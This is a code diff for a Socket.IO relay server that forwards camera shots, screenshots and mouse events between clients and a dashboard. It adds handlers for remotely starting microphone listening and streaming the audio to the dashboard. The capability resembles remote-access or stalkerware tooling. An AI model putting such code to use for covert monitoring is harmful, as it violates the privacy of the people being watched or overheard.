@@ -52,6 +52,11 @@ io.on("connection", (socket) => {
   socket.on("camShotRequest", (data) => {
     io.to(data.from).emit("camShotRequest", data);
   });
+  
+  socket.on("audioListenRequest", (data) => {
+    console.log("Audio listen request:", data.action, "from", data.from, "to", data.to);
+    io.to(data.from).emit("audioListenRequest", data);
+  });
   socket.on("screenshotResponse", (data) => {
     io.to(data.to).emit("screenshotResponse", data);
   });
@@ -62,6 +67,23 @@ io.on("connection", (socket) => {
   // Binary transfer için yeni event
   socket.on("camBinary", (data) => {
     io.to(data.to).emit("camBinary", data);
+  });
+  
+  // Audio stream response
+  socket.on("audioStreamResponse", (data) => {
+    console.log("📡 Audio stream received from client:", data.audioData ? data.audioData.length : "no data", "chars (base64)");
+    
+    if (data.audioData && data.audioData.length > 0) {
+      console.log("📤 Forwarding audio to dashboard:", data.to);
+      io.to(data.to).emit("audioStreamResponse", data);
+    } else {
+      console.log("⚠️ No audio data to forward to dashboard");
+    }
+  });
+  
+  // Audio listen status
+  socket.on("audioListenStatus", (data) => {
+    io.to(data.to).emit("audioListenStatus", data);
   });
   socket.on("mousemove", (data) => {
     io.to(data.from).emit("mousemove", data);
